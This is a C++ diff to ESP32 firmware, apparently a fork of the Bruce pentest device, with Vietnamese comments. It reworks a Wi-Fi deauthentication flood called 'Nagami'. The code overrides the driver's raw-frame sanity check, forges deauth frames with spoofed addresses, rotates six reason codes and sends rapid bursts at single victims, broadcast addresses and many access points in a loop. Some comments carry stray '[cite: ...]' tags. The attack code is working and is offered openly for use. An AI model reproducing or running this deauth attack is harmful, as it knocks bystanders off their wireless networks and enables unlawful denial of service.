@@ -47,11 +47,12 @@ std::vector<wifi_ap_record_t> ap_records;
 //     uint8_t reason[2];
 // } __attribute__((packed)) nagami_frame_t;
 
-static uint16_t nagami_seq = 0; // Quản lý số thứ tự gói tin
-uint16_t nagami_reasons[] = {1, 4, 6, 7, 8, 39}; // Danh sách mã lỗi "hủy diệt"
+// --- BIẾN QUẢN LÝ NAGAMI ---
+static uint16_t nagami_seq = 0; 
+uint16_t nagami_reasons[] = {1, 4, 6, 7, 8, 39}; // 6 mã lỗi hủy diệt 
 
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-    if (arg == 31337) return 1;
+    if (arg == 31337) return 1; // Giữ nguyên Bypass của Bruce 
     else return 0;
 }
 
@@ -757,31 +758,29 @@ AGAIN:
 }
 /***************************************************************************************
 ***************************************************************************************/
-void nagami_fire(uint8_t* victim_mac, uint8_t* ap_bssid) {
-    for (int r = 0; r < 6; r++) { // Xoay vòng 6 mã lỗi
-        nagami_frame_t frame;
-        frame.frame_ctrl[0] = 0xC0; // Loại gói: Deauthentication
-        frame.frame_ctrl[1] = 0x00;
-        frame.duration[0] = 0x3A;
-        frame.duration[1] = 0x01;
-        
-        memcpy(frame.da, victim_mac, 6);
-        memcpy(frame.sa, ap_bssid, 6);
-        memcpy(frame.bssid, ap_bssid, 6);
-        
-        // Nhảy Sequence Number thủ công (Chìa khóa sức mạnh)
-        nagami_seq = (nagami_seq + 1) % 4096;
-        uint16_t seq_ctrl = (nagami_seq << 4);
-        frame.seq[0] = seq_ctrl & 0xFF;
-        frame.seq[1] = (seq_ctrl >> 8) & 0xFF;
-        
-        // Gán Reason Code
-        frame.reason[0] = nagami_reasons[r] & 0xFF;
-        frame.reason[1] = (nagami_reasons[r] >> 8) & 0xFF;
+void nagami_ultimate_fire(uint8_t* da, uint8_t* sa, uint8_t* bssid, uint16_t reason) {
+    nagami_frame_t frame;
+    frame.frame_ctrl[0] = 0xC0; 
+    frame.frame_ctrl[1] = 0x00;
+    frame.duration[0] = 0x3A;
+    frame.duration[1] = 0x01;
+    
+    memcpy(frame.da, da, 6);
+    memcpy(frame.sa, sa, 6);
+    memcpy(frame.bssid, bssid, 6);
+    
+    // NHẢY SEQUENCE NUMBER THỦ CÔNG [cite: 441-442]
+    nagami_seq = (nagami_seq + 1) % 4096;
+    uint16_t seq_ctrl = (nagami_seq << 4);
+    frame.seq[0] = seq_ctrl & 0xFF;
+    frame.seq[1] = (seq_ctrl >> 8) & 0xFF;
+    
+    // GÁN REASON CODE [cite: 443-444]
+    frame.reason[0] = reason & 0xFF;
+    frame.reason[1] = (reason >> 8) & 0xFF;
 
-        // Bắn qua Driver Bypass của Bruce
-        esp_wifi_80211_tx(WIFI_IF_AP, &frame, sizeof(frame), false);
-    }
+    // Bắn qua Driver Bypass của Bruce
+    esp_wifi_80211_tx(WIFI_IF_AP, &frame, sizeof(frame), false);
 }
 
 
@@ -797,7 +796,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     drawMainBorderWithTitle("NAGAMI SINGLE");
     tft.setTextColor(TFT_RED, bruceConfig.bgColor);
     tft.println("\nTarget: " + tssid);
-    tft.println("Mode: ULTIMATE");
+    tft.println("Mode: ULTIMATE (Nagami)");
 
     uint8_t victim[6];
     sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &victim[0], &victim[1], &victim[2], &victim[3], &victim[4], &victim[5]);
@@ -805,13 +804,17 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
     while (true) {
-        // Đòn đánh kép: Đánh trực diện Victim và đánh lan toàn mạng (Broadcast)
-        nagami_fire(victim, victim);
-        nagami_fire((uint8_t*)_default_target, victim);
-
-        vTaskDelay(pdMS_TO_TICKS(5)); // Tần suất cực cao
+        for (int i = 0; i < 6; i++) {
+            // Đòn đánh kép: Victim + Broadcast [cite: 448-449]
+            nagami_ultimate_fire(victim, victim, victim, nagami_reasons[i]);
+            nagami_ultimate_fire((uint8_t*)_default_target, victim, victim, nagami_reasons[i]);
+            
+            if (check(EscPress)) goto STOP_SINGLE;
+        }
+        vTaskDelay(pdMS_TO_TICKS(10)); // Nghỉ 10ms để ổn định Radio
         if (check(EscPress)) break;
     }
+STOP_SINGLE:
     wifi_atk_unsetWifi();
     returnToMenu = true;
 }
@@ -1083,13 +1086,16 @@ void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
     while (true) {
         for (const auto &target : targets) {
             esp_wifi_set_channel(target.primary, WIFI_SECOND_CHAN_NONE);
-            vTaskDelay(pdMS_TO_TICKS(5)); 
+            vTaskDelay(pdMS_TO_TICKS(5)); // Nghỉ 5ms để Radio khóa sóng
 
-            // Burst 10 loạt Nagami mỗi AP (60 gói tin đa dạng mã lỗi)
-            for (int i = 0; i < 10; i++) {
-                nagami_fire((uint8_t*)_default_target, (uint8_t*)target.bssid);
-                if (check(EscPress)) goto EXIT_ENGINE;
+            // Burst hỏa lực: 6 loại mã lỗi x 10 phát mỗi loại = 60 gói/AP
+            for (int r = 0; r < 6; r++) {
+                for (int burst = 0; burst < 10; burst++) {
+                    nagami_ultimate_fire((uint8_t*)_default_target, (uint8_t*)target.bssid, (uint8_t*)target.bssid, nagami_reasons[r]);
+                    if (check(EscPress)) goto EXIT_ENGINE;
+                }
             }
+            vTaskDelay(pdMS_TO_TICKS(2));
         }
         vTaskDelay(pdMS_TO_TICKS(10));
         if (check(EscPress)) goto EXIT_ENGINE;
